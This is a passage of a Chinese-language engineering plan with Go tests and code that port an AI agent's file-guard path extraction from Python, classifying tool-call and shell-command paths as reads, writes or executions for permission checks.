
	got := ExtractAccessesNative("read_file", args, ws, nil)
	if len(got) == 0 {
		t.Fatal("未抽出任何访问")
	}
	if got[0].Action != FileActionRead {
		t.Errorf("Action = %v, want read", got[0].Action)
	}
	if got[0].Source != "tool_arg" {
		t.Errorf("Source = %q, want tool_arg", got[0].Source)
	}
	if got[0].Path != filepath.Join(ws, "a.txt") {
		t.Errorf("Path = %q, want %q", got[0].Path, filepath.Join(ws, "a.txt"))
	}
}

// TestExtractAccessesNative_写工具 测试写工具的 action 是 write
func TestExtractAccessesNative_写工具(t *testing.T) {
	ws := t.TempDir()
	args := map[string]any{"file_path": filepath.Join(ws, "b.txt")}

	got := ExtractAccessesNative("write_file", args, ws, nil)
	if len(got) == 0 {
		t.Fatal("未抽出任何访问")
	}
	if got[0].Action != FileActionWrite {
		t.Errorf("Action = %v, want write", got[0].Action)
	}
}

// TestExtractAccessesNative_无spec的路径工具 测试走 _PATH_TOOLS 兜底分支
func TestExtractAccessesNative_无spec的路径工具(t *testing.T) {
	ws := t.TempDir()
	// apply_patch 在 _PATH_TOOLS 但无 spec，应走兜底分支
	args := map[string]any{"file_path": filepath.Join(ws, "c.txt")}

	got := ExtractAccessesNative("apply_patch", args, ws, nil)
	if len(got) == 0 {
		t.Fatal("未抽出任何访问（应走 _PATH_TOOLS 兜底分支）")
	}
	if got[0].Action != FileActionWrite {
		t.Errorf("Action = %v, want write（apply_patch 在 _WRITE_PATH_TOOLS）", got[0].Action)
	}
}

// TestExtractAccessesNative_shell分支 测试 shell 工具走 shlex 抽取
func TestExtractAccessesNative_shell分支(t *testing.T) {
	ws := t.TempDir()
	target := filepath.Join(ws, "x.txt")
	args := map[string]any{"command": "cat " + target}

	got := ExtractAccessesNative("bash", args, ws, nil)
	if len(got) == 0 {
		t.Fatal("未抽出任何访问")
	}
	if got[0].Source != "shlex" {
		t.Errorf("Source = %q, want shlex", got[0].Source)
	}
}

// TestExtractAccessesNative_未知工具 测试无 spec 且非 path/shell 返回空
func TestExtractAccessesNative_未知工具(t *testing.T) {
	ws := t.TempDir()
	got := ExtractAccessesNative("some_unknown_tool", map[string]any{"x": "y"}, ws, nil)
	if len(got) != 0 {
		t.Errorf("got %d 条访问, want 0", len(got))
	}
}
```

- [ ] **Step 3: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -run TestExtractAccessesNative 2>&1 | head
```

Expected: `undefined: ExtractAccessesNative`。

- [ ] **Step 4: 实现 A 组（路径规整）+ G 组的 `_specs_for_tool`**

```go
// ──────────────────────────── 结构体 ────────────────────────────

// FileAccess 一次路径访问的抽取结果。
//
// Python: extract_accesses_native 返回的 (path, action, source) 三元组
type FileAccess struct {
	// Path 归整后的绝对路径
	Path string
	// Action 访问动作
	Action FileAction
	// Source 抽取来源："tool_arg"（来自注册 spec 或 _PATH_TOOLS）或 "shlex"（来自 shell 解析）
	Source string
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// isWindowsAbsText 判定是否为 Windows 绝对路径文本（盘符或 UNC）。
//
// Python: _is_windows_abs_text(text)
func isWindowsAbsText(text string) bool {
	s := strings.TrimSpace(text)
	if s == "" {
		return false
	}
	if strings.HasPrefix(s, `\\`) {
		return true
	}
	// 盘符形式：X:\ 或 X:/
	if len(s) >= 3 && s[1] == ':' && (s[2] == '\\' || s[2] == '/') {
		c := s[0]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			return true
		}
	}
	return false
}

// resolveExtractPath 把路径解析为绝对路径（符号链接按 no-follow 语义）。
//
// Python: _resolve_extract_path(path)
func resolveExtractPath(p string) string {
	if resolved, err := filepath.Abs(p); err == nil {
		// Python 的 Path.resolve() 对不存在的路径也返回绝对路径
		return filepath.Clean(resolved)
	}
	return filepath.Clean(p)
}

// looksLikePath 判定一个 token 是否像路径。
//
// Python: _looks_like_path(token)
func looksLikePath(token string) bool {
	s := strings.TrimSpace(token)
	if s == "" {
		return false
	}
	if strings.HasPrefix(s, `\\`) || strings.HasPrefix(s, "./") || strings.HasPrefix(s, "../") {
		return true
	}
	if isWindowsAbsText(s) {
		return true
	}
	return strings.Contains(s, "\\") || strings.Contains(s, "/")
}

// resolvePathStr 把一个原始路径字符串解析为绝对路径，失败返回空串。
//
// Python: _resolve_path_str(raw, workspace)
func resolvePathStr(raw string, workspace string) string {
	text := strings.TrimSpace(raw)
	text = strings.Trim(text, `"`)
	text = strings.Trim(text, `'`)
	if text == "" {
		return ""
	}
	expanded := expandHomeToken(text)
	if !isWindowsAbsText(expanded) && !path.IsAbs(expanded) {
		expanded = filepath.Join(workspace, expanded)
	}
	return resolveExtractPath(expanded)
}

// specsForTool 查询工具的参数约定。
//
// Python: _specs_for_tool(tool_name)
func specsForTool(toolName string) []FileToolSpec {
	return LookupFileToolSpecs(toolName)
}
```

- [ ] **Step 5: 实现 B 组（home 展开）**

```go
// joinHomeRest 把 home 目录与剩余路径拼接。
//
// Python: _join_home_rest(rest)
func joinHomeRest(rest string) string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return rest
	}
	trimmed := strings.TrimLeft(rest, "/\\")
	if trimmed == "" {
		return home
	}
	return filepath.Join(home, trimmed)
}

// unglueHomeHidden 处理 `~` 与隐藏文件名粘连的情况（如 `~/.ssh` 被切成 `~/` + `.ssh`）。
//
// Python: _unglue_home_hidden(path_text)
func unglueHomeHidden(pathText string) string {
	if !strings.HasPrefix(pathText, "~") {
		return pathText
	}
	rest := pathText[1:]
	if rest == "" {
		return joinHomeRest("")
	}
	if rest[0] == '/' || rest[0] == '\\' {
		return joinHomeRest(rest)
	}
	return joinHomeRest(rest)
}

// expandHomeToken 展开 `~` 前缀。
//
// Python: _expand_home_token(tok)
func expandHomeToken(tok string) string {
	text := strings.TrimSpace(tok)
	if !strings.HasPrefix(text, "~") {
		return text
	}
	// 只展开 `~` 或 `~/` 形式，`~user` 不展开
	if len(text) > 1 && text[1] != '/' && text[1] != '\\' {
		return text
	}
	return unglueHomeHidden(text)
}
```

- [ ] **Step 6: 实现 G 组的 `ExtractAccessesNative`**

```go
// ExtractAccessesNative 抽取一次工具调用的全部路径访问。
//
// 三个分支按顺序判定（顺序不可调换）：
//  1. shell 工具 → 解析命令行（source="shlex"）
//  2. 有注册 spec → 按 spec 的 arg_name/action 逐项解析（source="tool_arg"）
//  3. 是 _PATH_TOOLS 成员 → 遍历路径字符串，读写由 _WRITE_PATH_TOOLS 决定
//
// Python: extract_accesses_native(tool_name, tool_args, workspace, permission_config=None)
func ExtractAccessesNative(toolName string, toolArgs map[string]any, workspace string, permissionConfig map[string]any) []FileAccess {
	out := make([]FileAccess, 0, 4)

	// 1. shell 工具
	if isShellTool(toolName, shellToolsFromConfig(permissionConfig)) {
		workdir := resolveShellWorkdir(toolArgs, workspace)
		cmd := commandFromArgs(toolArgs)
		for _, acc := range extractShellPathAccesses(cmd, workdir) {
			out = append(out, FileAccess{Path: acc.Path, Action: acc.Action, Source: "shlex"})
		}
		return out
	}

	// 2. 注册 spec
	if specs := specsForTool(toolName); len(specs) > 0 {
		for _, spec := range specs {
			raw, ok := toolArgs[spec.ArgName].(string)
			if !ok || strings.TrimSpace(raw) == "" {
				continue
			}
			resolved := resolvePathStr(raw, workspace)
			if resolved == "" {
				continue
			}
			out = append(out, FileAccess{Path: resolved, Action: spec.Action, Source: "tool_arg"})
		}
		return out
	}

	// 3. _PATH_TOOLS 兜底
	if pathTools[toolName] {
		action := FileActionRead
		if writePathTools[toolName] {
			action = FileActionWrite
		}
		for _, s := range iterPathStrings(toolName, toolArgs) {
			resolved := resolvePathStr(s, workspace)
			if resolved == "" {
				continue
			}
			out = append(out, FileAccess{Path: resolved, Action: action, Source: "tool_arg"})
		}
	}
	return out
}

// resolveShellWorkdir 解析 shell 命令的工作目录：workdir 参数优先，绝对路径优先于相对。
//
// Python: extract_accesses_native 的 workdir 处理段
func resolveShellWorkdir(toolArgs map[string]any, workspace string) string {
	workdir := workspace
	if raw, ok := toolArgs["workdir"].(string); ok && strings.TrimSpace(raw) != "" {
		if isWindowsAbsText(raw) || path.IsAbs(raw) {
			return resolveExtractPath(raw)
		}
		return resolveExtractPath(filepath.Join(workspace, raw))
	}
	return resolveExtractPath(workdir)
}

// commandFromArgs 从 args 取命令行（command 优先，其次 cmd）。
//
// Python: str(tool_args.get("command", "") or tool_args.get("cmd", ""))
func commandFromArgs(toolArgs map[string]any) string {
	if v, ok := toolArgs["command"].(string); ok && v != "" {
		return v
	}
	if v, ok := toolArgs["cmd"].(string); ok {
		return v
	}
	return ""
}
```

- [ ] **Step 7: 补齐依赖的符号（`isShellTool` / `shellToolsFromConfig` / `pathTools` / `writePathTools` / `iterPathStrings`）**

这些在 Python 里来自 `toolguard.tool_policy`。Go 侧 `tiered_policy.go` 有非导出版本但**跨包不可访问**。

**按 spec 偏差 D3 的选定方案 B**：在 `security` 包导出它们。在 `tiered_policy.go` 新增：

```go
// PathTools 路径类工具集合，供 fileguard 子包引用。
//
// Python: _PATH_TOOLS (tool_policy.py)
var PathTools = map[string]bool{
	"apply_patch": true, "lsp": true, "read_file": true, "read_pdf": true,
	"write_file": true, "edit_file": true, "read_text_file": true,
	"write_text_file": true, "write": true, "read": true,
	"glob_file_search": true, "glob": true, "list_dir": true,
	"list_files": true, "grep": true, "search_replace": true,
}

// WritePathTools 写类路径工具集合。
//
// Python: _WRITE_PATH_TOOLS (tool_policy.py)
var WritePathTools = map[string]bool{
	"apply_patch": true, "write_file": true, "edit_file": true,
	"write_text_file": true, "write": true, "search_replace": true,
}

// IterPathStrings 遍历一次调用里所有像路径的字符串参数。
//
// Python: _iter_path_strings(tool_name, tool_args)
func IterPathStrings(toolName string, toolArgs map[string]any) []string {
	return iterPathStrings(toolName, toolArgs)
}
```

> **import 循环检查**：`fileguard` 要 import 父包 `security` 才能用 `IterPathStrings`。父包 `security` **不能** import `fileguard`，否则成环。
>
> **因此引擎里对 `fileguard` 的引用必须放在 `permission_engine.go`**——它同属 `security` 包，也会成环！
>
> **正确解法**：把 `FileGuardChecker` 的使用抽象为接口，接口定义在 `security` 包，`fileguard` 实现它，`permission_engine.go` 只依赖接口，**实际构造由外部（`factory.go` 或 `BuildFileGuardChecker` 的回调）注入**。
>
> 见 Step 8。

- [ ] **Step 8: 解决 `security` ↔ `fileguard` 的循环依赖**

`fileguard` 需要 `security` 的 `PathTools` / `IterPathStrings` / `PermissionLevel` / `PermissionResult`；`security` 需要 `fileguard` 的判定器。这必然成环。

**解法：工厂注入（与项目既有的 `PermissionRailConstructor` 同款模式）。接口与工厂变量的完整定义在 Task 9 Step 3 的 `security/fileguard_evaluator.go`，本步只做三件事：**

1. **在 `fileguard` 包内加编译期断言**（Task 6 Step 7 已给）
2. **在 `fileguard` 的 `init` 里注册工厂**（Task 6 Step 7 已给）
3. **在 `netguard` 的 `init` 里注册工厂**（Task 8 Step 5 已给）

`fileguard` 通过 `import "…/security"` 单向引用 `PathTools` / `IterPathStrings` / `PermissionLevel` / `PermissionResult` —— 这是单向依赖，不成环。

**谁触发两个子包的 `init`？** 必须在某个必然被加载的上层包做 blank import。落在
`internal/swarm/agents/harness/common/rails/permissions/permissions_persist.go` 的 import 块（该文件已被权限链路必然加载）：

```go
import (
	_ "github.com/uapclaw/uapclaw-go/internal/agentcore/harness/security/fileguard"
	_ "github.com/uapclaw/uapclaw-go/internal/agentcore/harness/security/netguard"
)
```

> 🔴 **本步是本任务最关键的架构决策**。若工程师发现此方案实现困难，**停止并汇报**，不要自行改用其他破环方式（例如把 `PathTools` 复制一份到 fileguard——那会造成双份数据漂移）。
>
> **验证方式**：Task 9 Step 8 的 `TestCheckPermission_B段路径防护` 会失败（`fileGuard` 为 nil），说明 init 未被触发。此时检查 blank import 是否生效。

- [ ] **Step 9: 实现 C/D/E/F 组（token 判定、引号分段、单段抽取、shell 抽取）**

**先写常量与正则**（对齐 Python L33-79，逐项照抄）：

```go
// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// separatorResidueRe 匹配 token 末尾的 shell 分隔符残留
	separatorResidueRe = regexp.MustCompile(`[;|&]+$`)
	// ntCmdSwitchBodyRe 匹配 cmd.exe 开关体（如 b / s/q）
	ntCmdSwitchBodyRe = regexp.MustCompile(`^[A-Za-z]{1,2}(?::[^\s/\\]+)?$`)
	// fdAliasRe 匹配 `&N` 形式的 fd 别名
	fdAliasRe = regexp.MustCompile(`^&\d+$`)
	// unexpandedVarRe 匹配未展开的 shell 变量（$VAR / ${VAR} / $env:VAR）
	unexpandedVarRe = regexp.MustCompile(`(?i)\$(\w+|\{[^}]+\}|env:\w+)`)
	// quotedSpanRe 匹配完整的一对单/双引号（含转义）
	quotedSpanRe = regexp.MustCompile(`"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'`)
	// winAbsRe 匹配 Windows 盘符绝对路径
	winAbsRe = regexp.MustCompile(`^[A-Za-z]:[\\/]`)
	// winUserProfileRe 匹配 %USERPROFILE%
	winUserProfileRe = regexp.MustCompile(`(?i)%USERPROFILE%`)
	// winHomeDrivePathRe 匹配 %HOMEDRIVE%%HOMEPATH%
	winHomeDrivePathRe = regexp.MustCompile(`(?i)%HOMEDRIVE%%HOMEPATH%`)
	// redirectTargetRe 匹配重定向运算符与目标
	redirectTargetRe = regexp.MustCompile(`(?:^|[\s;|&])(\d*>>?|\d*<|&>)\s+([^\s;|&<>]+)`)

	// pathAwareCommands 会访问路径的命令
	pathAwareCommands = map[string]struct{}{
		"cd": {}, "rm": {}, "cp": {}, "mv": {}, "mkdir": {}, "touch": {},
		"chmod": {}, "chown": {}, "cat": {}, "ls": {}, "dir": {}, "type": {},
		"del": {}, "erase": {}, "rd": {}, "rmdir": {}, "copy": {}, "move": {},
		"md": {}, "head": {}, "tail": {}, "more": {}, "less": {}, "vim": {},
		"nano": {}, "gedit": {}, "notepad": {},
		"get-content": {}, "gc": {},
		"set-content": {}, "add-content": {}, "out-file": {}, "tee-object": {},
		"sc": {}, "remove-item": {}, "ri": {}, "new-item": {}, "ni": {},
	}
	// interpreterBasenames 解释器类命令（脚本首参需按 exec 记）
	interpreterBasenames = map[string]struct{}{
		"python": {}, "python3": {}, "pythonw": {}, "py": {},
		"node": {}, "nodejs": {}, "bash": {}, "sh": {}, "dash": {},
		"zsh": {}, "fish": {}, "pwsh": {}, "powershell": {},
	}
	// ntCmdSwitchCommands 在 POSIX 上仍按 cmd.exe 语义解释开关的命令
	ntCmdSwitchCommands = map[string]struct{}{
		"cd": {}, "dir": {}, "del": {}, "erase": {}, "copy": {}, "move": {},
		"rd": {}, "rmdir": {}, "md": {}, "type": {}, "ren": {}, "rename": {},
		"xcopy": {}, "attrib": {}, "cmd": {}, "notepad": {},
	}
	// readCmds 只读类命令
	readCmds = map[string]struct{}{
		"cat": {}, "ls": {}, "dir": {}, "type": {}, "head": {}, "tail": {},
		"more": {}, "less": {}, "get-content": {}, "gc": {},
	}
	// writeCmds 写入类命令
	writeCmds = map[string]struct{}{
		"rm": {}, "mkdir": {}, "touch": {}, "chmod": {}, "chown": {},
		"del": {}, "erase": {}, "rd": {}, "rmdir": {}, "md": {},
		"set-content": {}, "add-content": {}, "out-file": {}, "tee-object": {},
		"sc": {}, "remove-item": {}, "ri": {}, "new-item": {}, "ni": {},
	}
	// psPathFlags PowerShell 的路径参数开关
	psPathFlags = map[string]struct{}{"-path": {}, "-literalpath": {}, "-filepath": {}}
	// transferCmds 传输类命令（首参读、其余写）
	transferCmds = map[string]struct{}{"cp": {}, "copy": {}, "mv": {}, "move": {}}
)
```

**C 组：token 判定**

```go
// ntCmdExeSwitchToken 判定是否为 cmd.exe 开关（如 /b、/d、/s/q）。
//
// Linux 上仍会见到 Windows 的 dir /b、cd /d（经 cmd //c 传入），对这些
// cmd 内建命令把 token 当开关处理；POSIX 工具如 ls /b、cat /tmp 仍按路径。
//
// Python: _nt_cmd_exe_switch_token(stripped, *, cmd0)
func ntCmdExeSwitchToken(stripped, cmd0 string) bool {
	if !strings.HasPrefix(stripped, "/") || strings.HasPrefix(stripped, "//") {
		return false
	}
	if strings.Contains(stripped, `\`) {
		return false
	}
	parts := make([]string, 0, 2)
	for _, p := range strings.Split(stripped, "/") {
		if p != "" {
			parts = append(parts, p)
		}
	}
	if len(parts) == 0 {
		return false
	}
	for _, p := range parts {
		if !ntCmdSwitchBodyRe.MatchString(p) {
			return false
		}
	}
	if runtime.GOOS == "windows" {
		return true
	}
	_, hit := ntCmdSwitchCommands[cmd0]
	return hit
}

// looksLikeRedirectTarget 判定是否为可用的重定向目标（排除 fd 别名与变量）。
//
// Python: _looks_like_redirect_target(token)
func looksLikeRedirectTarget(token string) bool {
	t := strings.Trim(strings.Trim(strings.TrimSpace(token), `"`), `'`)
	if t == "" || fdAliasRe.MatchString(t) {
		return false
	}
	if strings.HasPrefix(t, "$") || unexpandedVarRe.MatchString(t) {
		return false
	}
	return true
}

// isShellFlagToken 判定是否为命令开关（-x / --long）。
//
// Python: _is_shell_flag_token(tok, *, cmd0)
func isShellFlagToken(tok, cmd0 string) bool {
	t := strings.Trim(strings.Trim(strings.TrimSpace(tok), `"`), `'`)
	if t == "" {
		return false
	}
	if ntCmdExeSwitchToken(t, cmd0) {
		return true
	}
	if !strings.HasPrefix(t, "-") {
		return false
	}
	// 单独的 "-" 是 stdin 占位，不是开关
	return t != "-"
}

// stripSeparatorResidue 去掉粘连在路径上的 shell 分隔符（如 `file;`）。
//
// 引号内或反斜杠转义的分隔符属于文件名，保留。
//
// Python: _strip_separator_residue(token)
func stripSeparatorResidue(token string) string {
	text := strings.TrimSpace(token)
	if len(text) >= 2 && text[0] == text[len(text)-1] && (text[0] == '\'' || text[0] == '"') {
		return text[1 : len(text)-1]
	}
	if len(text) >= 2 {
		last := text[len(text)-1]
		if (last == ';' || last == '|' || last == '&') && text[len(text)-2] == '\\' {
			return text[:len(text)-2] + string(last)
		}
	}
	stripped := separatorResidueRe.ReplaceAllString(text, "")
	if stripped == "" {
		return text
	}
	return stripped
}

// basenameLower 取命令名并小写去路径去 .exe 后缀。
//
// Python: _basename_lower(cmd)
func basenameLower(cmd string) string {
	text := strings.TrimSpace(cmd)
	if text == "" {
		return ""
	}
	for i, r := range text {
		if r == ' ' || r == '\t' {
			text = text[:i]
			break
		}
	}
	text = strings.ReplaceAll(text, `\`, "/")
	if idx := strings.LastIndex(text, "/"); idx >= 0 {
		text = text[idx+1:]
	}
	text = strings.ToLower(text)
	return strings.TrimSuffix(text, ".exe")
}
```

**D 组：引号与分段**

```go
// quotedSpans 返回命令里所有完整引号对的 [start, end) 区间。
//
// Python: _quoted_spans(command)
func quotedSpans(command string) [][2]int {
	matches := quotedSpanRe.FindAllStringIndex(command, -1)
	out := make([][2]int, 0, len(matches))
	for _, m := range matches {
		out = append(out, [2]int{m[0], m[1]})
	}
	return out
}

// indexInQuotedSpan 判定下标是否严格落在某个引号区间内（不含端点）。
//
// Python: _index_in_quoted_span(index, spans)
func indexInQuotedSpan(index int, spans [][2]int) bool {
	for _, sp := range spans {
		if index > sp[0] && index < sp[1] {
			return true
		}
	}
	return false
}

// ampersandIsRedirect 判定 `&` 是重定向（>& / <& / &>）而非命令分隔符。
//
// Python: _ampersand_is_redirect(command, index)
func ampersandIsRedirect(command string, index int) bool {
	prev := byte(0)
	if index > 0 {
		prev = command[index-1]
	}
	next := byte(0)
	if index+1 < len(command) {
		next = command[index+1]
	}
	return prev == '<' || prev == '>' || next == '>'
}

// splitUnquotedCommandSegments 按未在引号内的 ; & | 分段，`\;` 保段内。
//
// Python: _split_unquoted_command_segments(command)
func splitUnquotedCommandSegments(command string) []string {
	spans := quotedSpans(command)
	var parts []string
	var buf strings.Builder
	index := 0
	length := len(command)
	for index < length {
		if indexInQuotedSpan(index, spans) {
			buf.WriteByte(command[index])
			index++
			continue
		}
		char := command[index]
		if char == '\\' && index+1 < length && (command[index+1] == ';' ||
			command[index+1] == '|' || command[index+1] == '&') {
			buf.WriteString(command[index : index+2])
			index += 2
			continue
		}
		if char == '&' && ampersandIsRedirect(command, index) {
			buf.WriteByte(char)
			index++
			continue
		}
		if char == ';' || char == '|' || char == '&' {
			// || 与 && 是单个运算符，跳过一个重复字符
			if index+1 < length && command[index+1] == char && char != ';' {
				index++
			}
			parts = append(parts, buf.String())
			buf.Reset()
			index++
			continue
		}
		buf.WriteByte(char)
		index++
	}
	parts = append(parts, buf.String())

	out := make([]string, 0, len(parts))
	for _, p := range parts {
		if trimmed := strings.TrimSpace(p); trimmed != "" {
			out = append(out, trimmed)
		}
	}
	return out
}
```

**E 组：单段抽取**（含 `_PATH_AWARE_COMMANDS` 的四类命令分派）

```go
// pathAwareOneSegment 抽取单条命令段的路径访问，并返回新的 cwd（仅 cd）。
//
// 命令分派顺序（对齐 Python，不可调换）：
//  1. 传输类（cp/copy/mv/move）且 >= 2 个路径 → 首参 read，其余 write
//  2. 写入类 → 全部 write
//  3. 读取类 → 全部 read；无路径的 ls/dir 记 cwd
//  4. cd → 路径 read 且更新 cwd；无参时用 home
//  5. 其他 → 全部 write
//
// Python: _path_aware_one_segment(segment, cwd, *, include_cd_reads=True)
func pathAwareOneSegment(segment, cwd string, includeCDReads bool) ([]FileAccess, string) {
	tokens := shlexSplit(segment)
	if len(tokens) == 0 {
		return nil, ""
	}
	cmd0 := basenameLower(tokens[0])
	if _, hit := pathAwareCommands[cmd0]; !hit {
		return nil, ""
	}
	base := resolveExtractPath(cwd)

	type pathToken struct {
		path string
	}
	pathTokens := make([]pathToken, 0, len(tokens))

	appendPathToken := func(tok string, requirePathShape bool) {
		tok = stripSeparatorResidue(tok)
		if tok == "" || unexpandedVarRe.MatchString(tok) {
			return
		}
		if requirePathShape && !looksLikePath(tok) {
			return
		}
		tok = expandHomeToken(tok)
		winAbs := isWindowsAbsText(tok)
		resolved := tok
		if !winAbs && !pathIsAbs(tok) {
			resolved = filepath.Join(base, tok)
		}
		if winAbs && runtime.GOOS != "windows" {
			pathTokens = append(pathTokens, pathToken{path: resolved})
			return
		}
		pathTokens = append(pathTokens, pathToken{path: resolveExtractPath(resolved)})
	}

	for _, tok := range tokens[1:] {
		if strings.TrimSpace(tok) == "" || isShellFlagToken(tok, cmd0) {
			continue
		}
		appendPathToken(tok, true)
	}

	// PowerShell 特有：get-content / set-content 等用 -Path 显式给路径
	if psCoversCommand(cmd0) {
		for _, extra := range collectPSPathTokens(tokens) {
			appendPathToken(extra, false)
		}
	}

	var results []FileAccess
	newCwd := ""

	if _, isTransfer := transferCmds[cmd0]; isTransfer && len(pathTokens) >= 2 {
		results = append(results, FileAccess{Path: pathTokens[0].path, Action: FileActionRead})
		for _, pt := range pathTokens[1:] {
			results = append(results, FileAccess{Path: pt.path, Action: FileActionWrite})
		}
	} else if _, isWrite := writeCmds[cmd0]; isWrite {
		for _, pt := range pathTokens {
			results = append(results, FileAccess{Path: pt.path, Action: FileActionWrite})
		}
	} else if _, isRead := readCmds[cmd0]; isRead {
		if len(pathTokens) == 0 && (cmd0 == "dir" || cmd0 == "ls") {
			results = append(results, FileAccess{Path: resolveExtractPath(base), Action: FileActionRead})
		} else {
			for _, pt := range pathTokens {
				results = append(results, FileAccess{Path: pt.path, Action: FileActionRead})
			}
		}
	} else if cmd0 == "cd" {
		if len(pathTokens) > 0 {
			if includeCDReads {
				for _, pt := range pathTokens {
					results = append(results, FileAccess{Path: pt.path, Action: FileActionRead})
				}
			}
			newCwd = pathTokens[len(pathTokens)-1].path
		} else if home, err := os.UserHomeDir(); err == nil {
			resolved := resolveExtractPath(home)
			results = append(results, FileAccess{Path: resolved, Action: FileActionRead})
			newCwd = resolved
		}
	} else {
		for _, pt := range pathTokens {
			results = append(results, FileAccess{Path: pt.path, Action: FileActionWrite})
		}
	}
	return results, newCwd
}

// psCoversCommand 判定命令是否走 PowerShell 的 -Path 参数抽取。
//
// Python: _path_aware_one_segment 内的 cmd0 in (...) 判断
func psCoversCommand(cmd0 string) bool {
	switch cmd0 {
	case "get-content", "gc", "set-content", "add-content", "out-file",
		"tee-object", "sc", "remove-item", "ri", "new-item", "ni":
		return true
	}
	return false
}

// extractPathAwareCommandAccesses 逐段抽取路径访问，cd 会切换后续段的 cwd。
//
// Python: extract_path_aware_command_accesses(command, workdir, *, include_cd_reads=True)
func extractPathAwareCommandAccesses(command, workdir string, includeCDReads bool) []FileAccess {
	if command == "" {
		return nil
	}
	command = toolguard.CanonicalizeShellCommandForPermission(command)
	cwd := resolveExtractPath(workdir)
	var combined []FileAccess
	for _, seg := range splitUnquotedCommandSegments(command) {
		part, newCwd := pathAwareOneSegment(seg, cwd, includeCDReads)
		combined = append(combined, part...)
		if newCwd != "" {
			cwd = newCwd
		}
	}
	return combined
}
```

**F 组：shell 抽取总入口**

```go
// extractShellPathAccesses shell 抽取总入口：脱壳 → 分段抽取 → 重定向 → 解释器脚本。
//
// 三个来源按顺序追加（对齐 Python）：
//  1. extractPathAwareCommandAccesses 的逐段结果
//  2. 重定向目标（`>` 写、`<` 读），跳过引号内的运算符
//  3. 解释器的首个脚本参数（exec）
//
// Python: extract_shell_path_accesses(command, workdir, *, include_cd_reads=True)
func extractShellPathAccesses(command, workdir string, includeCDReads bool) []FileAccess {
	if command == "" {
		return nil
	}
	command = toolguard.CanonicalizeShellCommandForPermission(command)
	base := resolveExtractPath(workdir)
	var results []FileAccess

	resolve := func(tok string, redirect bool) string {
		tok = stripSeparatorResidue(tok)
		if redirect {
			if !looksLikeRedirectTarget(tok) {
				return ""
			}
		} else if tok == "" || !looksLikePath(tok) {
			return ""
		}
		tok = expandHomeToken(tok)
		winAbs := isWindowsAbsText(tok)
		resolved := tok
		if !winAbs && !pathIsAbs(tok) {
			resolved = filepath.Join(base, tok)
		}
		if winAbs && runtime.GOOS != "windows" {
			return resolved
		}
		return resolveExtractPath(resolved)
	}

	// 1. 逐段路径抽取
	results = append(results, extractPathAwareCommandAccesses(command, workdir, includeCDReads)...)

	// 2. 重定向目标
	spans := quotedSpans(command)
	for _, m := range redirectTargetRe.FindAllStringSubmatchIndex(command, -1) {
		opStart := m[2]
		if indexInQuotedSpan(opStart, spans) {
			continue
		}
		op := command[m[2]:m[3]]
		target := command[m[4]:m[5]]
		resolved := resolve(target, true)
		if resolved == "" {
			continue
		}
		if strings.Contains(op, "<") && !strings.Contains(op, ">") {
			results = append(results, FileAccess{Path: resolved, Action: FileActionRead})
		} else {
			results = append(results, FileAccess{Path: resolved, Action: FileActionWrite})
		}
	}

	// 3. 解释器的脚本参数按 exec 记
	tokens := shlexSplit(command)
	if len(tokens) >= 2 {
		cmd0 := basenameLower(tokens[0])
		if _, isInterp := interpreterBasenames[cmd0]; isInterp {
			scriptTok := strings.TrimSpace(tokens[1])
			if scriptTok != "" && !strings.HasPrefix(scriptTok, "-") {
				if resolved := resolve(scriptTok, false); resolved != "" {
					results = append(results, FileAccess{Path: resolved, Action: FileActionExec})
				}
			}
		}
	}
	return results
}

// collectPSPathTokens 收集 PowerShell 的 -Path / -LiteralPath / -FilePath 参数值。
//
// Python: _collect_ps_path_tokens(tokens)
func collectPSPathTokens(tokens []string) []string {
	var out []string
	for idx := 1; idx < len(tokens); idx++ {
		raw := strings.Trim(strings.Trim(strings.TrimSpace(tokens[idx]), `"`), `'`)
		flag := strings.ToLower(strings.SplitN(raw, ":", 2)[0])
		if _, hit := psPathFlags[flag]; hit {
			if idx+1 < len(tokens) {
				out = append(out, tokens[idx+1])
			}
		}
	}
	return out
}

// shlexSplit 按 posix=false 语义切分（保留引号），失败时退化为空白切分。
//
// Python: shlex.split(segment.strip(), posix=False)
//
// 项目已依赖 github.com/anmitsu/go-shlex（见 security/suggestions.go:213），
// 其 Split(command string, posix bool) 的第二参数即 posix 开关。
func shlexSplit(s string) []string {
	tokens, err := shlex.Split(s, false)
	if err != nil {
		return strings.Fields(s)
	}
	return tokens
}

// pathIsAbs 判定是否为绝对路径（含 Windows 盘符形式）。
//
// 与 filepath.IsAbs 的差别：Linux 上 filepath.IsAbs("C:/x") 为 false，
// 而 Windows 盘符路径在语义上是绝对的，需单独识别。
func pathIsAbs(p string) bool {
	if isWindowsAbsText(p) {
		return true
	}
	return filepath.IsAbs(p)
}
```

**依赖的外部符号**：`shlex.Split` 来自 `github.com/anmitsu/go-shlex`（已在 go.mod，`security/suggestions.go` 已在用）。

```bash
grep -n "go-shlex" /home/opensource/uapclaw-gateway/go.mod
```

Expected: 有一行 `github.com/anmitsu/go-shlex vX.Y.Z`。若没有，先 `go get github.com/anmitsu/go-shlex`。

---

- [ ] **Step 10: 运行全部测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -v 2>&1 | tail -30
```

Expected: 全部 PASS。

- [ ] **Step 11: 用 Python 测试对照**

```bash
ls /home/opensource/agent-core/tests/unit_tests/harness/security/ | grep -i "path_extract\|file_guard"
```

对每个找到的 Python 测试文件，抄出其断言为 Go 表驱动用例。**这是验证对齐的主要手段**。

- [ ] **Step 12: 覆盖率 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/agentcore/harness/security/fileguard/
gofmt -l internal/agentcore/harness/security/fileguard/
git add internal/agentcore/harness/security/fileguard/path_extract.go \
        internal/agentcore/harness/security/fileguard/path_extract_test.go \
        internal/agentcore/harness/security/fileguard_evaluator.go \
        internal/agentcore/harness/security/tiered_policy.go
git commit -m "feat(fileguard): 参数到路径访问的抽取（path_extract.py 524 行）

三个分支顺序固定不可调换：shell 工具走 shlex 抽取、有注册 spec 按 spec
逐项解析、_PATH_TOOLS 兜底。

shell 抽取入口先调 CanonicalizeShellCommandForPermission 脱壳，否则
